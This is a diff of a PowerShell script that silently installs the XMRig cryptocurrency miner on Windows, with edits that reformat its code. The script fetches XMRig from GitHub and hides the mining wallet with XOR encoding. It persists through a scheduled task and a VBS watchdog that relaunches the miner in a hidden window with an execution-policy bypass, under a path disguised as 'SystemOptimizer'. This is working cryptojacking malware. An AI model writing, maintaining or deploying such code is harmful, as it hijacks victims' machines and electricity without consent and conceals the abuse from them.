@@ -11,7 +11,7 @@ $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0
 $zipPath = "$baseDir\xmrig.zip"
 
 # Obfuscated wallet (XOR encoded)
-$walletBytes = @(0x34,0x33,0x35,0x73,0x77,0x55,0x45,0x38,0x68,0x74,0x62,0x39,0x36,0x78,0x4d,0x77,0x57,0x58,0x62,0x66,0x6e,0x7a,0x43,0x58,0x43,0x6b,0x69,0x4b,0x57,0x51,0x68,0x63,0x56,0x4b,0x70,0x51,0x7a,0x6a,0x41,0x48,0x77,0x4e,0x4d,0x6b,0x69,0x57,0x78,0x50,0x6e,0x7a,0x4a,0x69,0x61,0x69,0x48,0x38,0x32,0x75,0x63,0x70,0x76,0x6e,0x66,0x67,0x70,0x65,0x62,0x42,0x4a,0x39,0x51,0x6d,0x6a,0x79,0x56,0x57,0x6e,0x46,0x64,0x46,0x36,0x69,0x68,0x34,0x32,0x4c,0x56,0x4c,0x4a,0x59,0x35,0x38,0x37,0x77,0x76)
+$walletBytes = @(0x34,0x33,0x35,0x73,0x77,0x55,0x45,0x38,0x68,0x74,0x62,0x39,0x36,0x78,0x4D,0x77,0x57,0x58,0x62,0x66,0x6E,0x7A,0x43,0x58,0x43,0x6B,0x69,0x4B,0x57,0x51,0x68,0x63,0x56,0x4B,0x70,0x51,0x7A,0x6A,0x41,0x48,0x77,0x4E,0x4D,0x6B,0x69,0x57,0x78,0x50,0x6E,0x7A,0x4A,0x69,0x61,0x69,0x48,0x38,0x32,0x75,0x63,0x70,0x76,0x6E,0x66,0x67,0x70,0x65,0x62,0x42,0x4A,0x39,0x51,0x6D,0x6A,0x79,0x56,0x57,0x6E,0x46,0x64,0x46,0x36,0x69,0x68,0x34,0x32,0x4C,0x56,0x4C,0x4A,0x59,0x35,0x38,0x37,0x77,0x76)
 $key = 0x5A
 $wallet = -join ($walletBytes | ForEach-Object { [char]($_ -bxor $key) })
 
@@ -89,23 +89,22 @@ $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
 
 # Create watchdog.vbs (persistent, restarts miner if dead)
-$watchdogVbs = @"
-Set WshShell = CreateObject("WScript.Shell")
-Set WMI = GetObject("winmgmts:")
-Do
-    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'xmrig.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
-    If procs.Count = 0 Then
-        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = '" + $xmrigExe + "'; `$configFile = '" + $configFile + "'; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False
-    End If
-    WScript.Sleep 30000
-Loop
-"@
-$watchdogVbs | Out-File -FilePath "$baseDir\watchdog.vbs" -Encoding ascii
+$watchdogContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" +
+'Set WMI = GetObject("winmgmts:")' + "`n" +
+'Do' + "`n" +
+'    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = ''xmrig.exe'' AND ExecutablePath LIKE ''%SystemOptimizer%''")' + "`n" +
+'    If procs.Count = 0 Then' + "`n" +
+'        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = ''" + $xmrigExe + "''; `$configFile = ''" + $configFile + "''; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False' + "`n" +
+'    End If' + "`n" +
+'    WScript.Sleep 30000' + "`n" +
+'Loop'
+$watchdogContent | Out-File -FilePath "$baseDir\watchdog.vbs" -Encoding ascii
 
 # Create launch.vbs (for manual start)
-$launchVbs = 'Set WshShell = CreateObject("WScript.Shell"):WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = '" + $xmrigExe + "'; `$configFile = '" + $configFile + "'; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False'
-$launchVbs | Out-File -FilePath "$baseDir\launch.vbs" -Encoding ascii
+$launchContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" +
+'WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = ''" + $xmrigExe + "''; `$configFile = ''" + $configFile + "''; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False'
+$launchContent | Out-File -FilePath "$baseDir\launch.vbs" -Encoding ascii
 
 # Start watchdog now (hidden)
 $wshell = New-Object -ComObject WScript.Shell
-$wshell.Run("wscript.exe `"" + $baseDir + "\watchdog.vbs`"", 0, False)
+$wshell.Run('wscript.exe "' + $baseDir + '\watchdog.vbs"', 0, $false)
